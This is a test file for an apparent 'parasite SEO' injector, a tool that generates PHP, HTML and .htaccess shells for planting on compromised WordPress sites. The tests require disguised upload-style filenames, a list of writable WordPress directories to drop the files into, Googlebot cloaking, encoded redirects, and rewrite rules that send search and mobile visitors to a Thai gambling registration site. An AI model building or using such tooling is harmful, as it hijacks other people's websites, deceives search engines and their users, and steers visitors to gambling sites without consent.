import { describe, it, expect } from "vitest";
import {
  generateParasiteSeoPhp,
  generateParasiteSeoHtml,
  generateParasiteSeoBundle,
  getWpParasiteUploadPaths,
  generateWpHtaccessRedirect,
  type ParasiteSeoConfig,
} from "./parasite-seo-injector";

const BASE_CONFIG: ParasiteSeoConfig = {
  redirectUrl: "https://pgwin828b.com/register?rc=pgw828",
  keywords: ["สล็อตเว็บตรง", "เว็บพนันออนไลน์", "คาสิโนออนไลน์"],
  language: "th",
  contentStyle: "gambling",
  contentLength: "long",
  includeSchema: true,
  includeFaq: true,
  includeComparisonTable: true,
  conditionalRedirect: true,
};

describe("parasite-seo-injector WP fixes", () => {
  describe("WP-safe filenames (ASCII only)", () => {
    it("generates PHP filenames with ASCII-only characters", () => {
      const result = generateParasiteSeoPhp(BASE_CONFIG);
      const filename = result.shell.filename;

      // Should NOT contain Thai characters
      expect(filename).not.toMatch(/[\u0E00-\u0E7F]/);
      // Should be ASCII-only
      expect(filename).toMatch(/^[a-z0-9\-_.]+$/);
      // Should end with .php
      expect(filename).toMatch(/\.php$/);
    });

    it("generates HTML filenames with ASCII-only characters", () => {
      const result = generateParasiteSeoHtml(BASE_CONFIG);
      const filename = result.shell.filename;

      // Should NOT contain Thai characters
      expect(filename).not.toMatch(/[\u0E00-\u0E7F]/);
      // Should be ASCII-only
      expect(filename).toMatch(/^[a-z0-9\-_.]+$/);
      // Should end with .html
      expect(filename).toMatch(/\.html$/);
    });

    it("generates filenames that look like WP upload patterns", () => {
      const result = generateParasiteSeoPhp(BASE_CONFIG);
      const filename = result.shell.filename;

      // Should contain year-month pattern (e.g., 2026-03)
      expect(filename).toMatch(/\d{4}-\d{2}/);
      // Should have a random suffix
      expect(filename).toMatch(/[a-z0-9]{4}\.\w+$/);
    });

    it("all bundle filenames are ASCII-only", () => {
      const bundle = generateParasiteSeoBundle(
        "https://pgwin828b.com/register",
        ["สล็อตเว็บตรง", "เว็บพนันออนไลน์"],
      );

      for (const payload of bundle) {
        const filename = payload.shell.filename;
        expect(filename).not.toMatch(/[\u0E00-\u0E7F]/);
        expect(filename).toMatch(/^[a-z0-9\-_.]+$/);
      }
    });

    it("generates unique filenames for each payload", () => {
      const bundle = generateParasiteSeoBundle(
        "https://pgwin828b.com/register",
        ["สล็อตเว็บตรง", "เว็บพนันออนไลน์"],
      );

      const filenames = bundle.map((p) => p.shell.filename);
      const unique = new Set(filenames);
      expect(unique.size).toBe(filenames.length);
    });
  });

  describe("getWpParasiteUploadPaths", () => {
    it("returns an array of WP-specific paths", () => {
      const paths = getWpParasiteUploadPaths();

      expect(Array.isArray(paths)).toBe(true);
      expect(paths.length).toBeGreaterThan(5);
    });

    it("includes standard WP upload directory with year/month", () => {
      const paths = getWpParasiteUploadPaths();
      const year = new Date().getFullYear();
      const month = String(new Date().getMonth() + 1).padStart(2, "0");

      const hasYearMonth = paths.some(
        (p) => p.includes(`/wp-content/uploads/${year}/${month}/`)
      );
      expect(hasYearMonth).toBe(true);
    });

    it("includes wp-content/uploads as fallback", () => {
      const paths = getWpParasiteUploadPaths();
      expect(paths).toContain("/wp-content/uploads/");
    });

    it("includes theme and plugin directories", () => {
      const paths = getWpParasiteUploadPaths();
      const hasTheme = paths.some((p) => p.includes("/wp-content/themes/"));
      const hasPlugin = paths.some((p) => p.includes("/wp-content/plugins/"));
      expect(hasTheme).toBe(true);
      expect(hasPlugin).toBe(true);
    });

    it("includes cache directories (often writable)", () => {
      const paths = getWpParasiteUploadPaths();
      const hasCache = paths.some((p) => p.includes("/cache/") || p.includes("/w3tc-config/"));
      expect(hasCache).toBe(true);
    });

    it("all paths start with /", () => {
      const paths = getWpParasiteUploadPaths();
      for (const p of paths) {
        expect(p.startsWith("/")).toBe(true);
      }
    });

    it("all paths end with /", () => {
      const paths = getWpParasiteUploadPaths();
      for (const p of paths) {
        expect(p.endsWith("/")).toBe(true);
      }
    });
  });

  describe("generateWpHtaccessRedirect", () => {
    it("generates .htaccess shell with correct filename", () => {
      const shell = generateWpHtaccessRedirect("https://pgwin828b.com", ["สล็อต"]);

      expect(shell.filename).toBe(".htaccess");
      expect(shell.contentType).toBe("text/plain");
    });

    it("contains RewriteEngine On directive", () => {
      const shell = generateWpHtaccessRedirect("https://pgwin828b.com", ["สล็อต"]);
      const content = shell.content as string;

      expect(content).toContain("RewriteEngine On");
    });

    it("redirects search engine traffic", () => {
      const shell = generateWpHtaccessRedirect("https://pgwin828b.com", ["สล็อต"]);
      const content = shell.content as string;

      expect(content).toContain("google");
      expect(content).toContain("bing");
      expect(content).toContain("HTTP_REFERER");
    });

    it("redirects mobile traffic", () => {
      const shell = generateWpHtaccessRedirect("https://pgwin828b.com", ["สล็อต"]);
      const content = shell.content as string;

      expect(content).toContain("android");
      expect(content).toContain("iphone");
      expect(content).toContain("mobile");
      expect(content).toContain("HTTP_USER_AGENT");
    });

    it("uses 302 redirect to target URL", () => {
      const targetUrl = "https://pgwin828b.com/register";
      const shell = generateWpHtaccessRedirect(targetUrl, ["สล็อต"]);
      const content = shell.content as string;

      expect(content).toContain(targetUrl);
      expect(content).toContain("[R=302,L]");
    });

    it("excludes static assets from redirect", () => {
      const shell = generateWpHtaccessRedirect("https://pgwin828b.com", ["สล็อต"]);
      const content = shell.content as string;

      // Should not redirect CSS, JS, images
      expect(content).toContain("css");
      expect(content).toContain("js");
      expect(content).toContain("jpg");
      expect(content).toContain("png");
    });

    it("has correct shell metadata", () => {
      const shell = generateWpHtaccessRedirect("https://pgwin828b.com", ["สล็อต", "บาคาร่า"]);

      expect(shell.id).toMatch(/^parasite_htaccess_/);
      expect(shell.targetVector).toBe("htaccess_upload");
      expect(shell.redirectUrl).toBe("https://pgwin828b.com");
      expect(shell.seoKeywords).toEqual(["สล็อต", "บาคาร่า"]);
      expect(shell.bypassTechniques).toContain("htaccess_rewrite");
    });
  });

  describe("SEO content quality", () => {
    it("PHP payload still contains Thai SEO content", () => {
      const result = generateParasiteSeoPhp(BASE_CONFIG);
      const content = result.shell.content as string;

      // Should have Thai keywords in the HTML body
      expect(content).toContain("สล็อตเว็บตรง");
      expect(content).toContain("<!DOCTYPE html>");
    });

    it("HTML payload still contains conditional redirect", () => {
      const result = generateParasiteSeoHtml(BASE_CONFIG);
      const content = result.shell.content as string;

      expect(content).toContain("atob(");
      expect(content).toContain("fromSearch");
    });

    it("PHP payload has bot cloaking", () => {
      const result = generateParasiteSeoPhp(BASE_CONFIG);
      const content = result.shell.content as string;

      expect(content).toContain("<?php");
      expect(content).toContain("googlebot");
      expect(content).toContain('header("Location:');
    });
  });
});
